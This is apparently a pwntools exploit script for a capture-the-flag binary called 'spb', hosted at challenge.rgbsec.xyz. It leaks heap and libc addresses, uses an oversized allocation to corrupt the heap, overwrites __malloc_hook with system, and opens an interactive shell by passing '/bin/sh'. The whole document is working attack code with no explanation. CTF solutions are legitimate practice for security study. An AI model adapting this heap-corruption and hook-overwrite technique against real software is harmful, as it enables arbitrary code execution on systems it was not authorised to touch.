from pwn import *

e = ELF("./spb")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("challenge.rgbsec.xyz", 6969)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

def alloc(size, data="AAAA"):
  p.sendlineafter(">", "1")
  p.sendlineafter(">", str(size))
  p.sendlineafter(">", data)

def leak():
  p.sendlineafter(">", "3")
  p.recvuntil("0x")
  
  return int(p.recvuntil(" "), 16)

p.sendlineafter(">", "0")
p.sendlineafter(">", "")

bi = leak() + 0x2010f8 + 0x40
alloc(0x10)
heap = leak()

alloc(0x100**8 - 0x290, data="")
p.sendlineafter(">", "")

alloc(0x70, "\x00" * 0x30 + p64(bi))
alloc(0x18)
alloc(0x18)

lbc = leak() - 0x7f8f21422680 + 0x00007f8f21036000
alloc(0x38, p64(lbc + libc.symbols["__malloc_hook"]))
alloc(0xb8, p64(lbc + libc.symbols["system"]))

debug()

p.sendlineafter(">", "1")
p.sendlineafter(">", str(lbc + next(libc.search("/bin/sh"))))



p.interactive()
